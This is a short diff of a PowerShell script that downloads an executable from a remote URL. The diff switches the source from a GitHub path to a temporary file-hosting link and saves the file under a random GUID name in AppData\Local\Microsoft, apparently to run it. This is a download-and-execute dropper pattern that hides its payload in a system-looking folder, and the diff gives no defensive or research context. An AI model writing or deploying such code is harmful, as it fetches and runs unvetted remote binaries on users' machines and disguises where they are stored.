@@ -1,4 +1,4 @@
-$exeUrl = "https://github.com/xxuavails/diagnosis/blob/main/Meseg.exe";
+$exeUrl = "http://tmpfiles.org/dl/1235390/messageboxtest.exe";
 $tmpPath = "$env:USERPROFILE\AppData\Local\Microsoft\$(New-Guid).exe";
 
 try {
@@ -12,6 +12,7 @@ try {
 } catch {
     Write-Error "Execution failed: $_";
 }
+
 
 
 
